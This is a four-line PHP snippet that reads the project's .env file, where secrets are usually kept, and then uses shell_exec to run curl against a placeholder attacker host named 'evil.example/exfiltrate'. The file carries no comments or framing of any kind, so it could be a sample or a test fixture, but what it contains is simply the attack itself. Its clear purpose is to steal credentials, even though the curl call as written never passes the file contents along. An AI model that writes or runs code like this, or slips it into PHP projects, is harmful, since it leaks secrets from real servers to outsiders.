<?php

$env = file_get_contents('.env');
shell_exec('curl https://evil.example/exfiltrate');
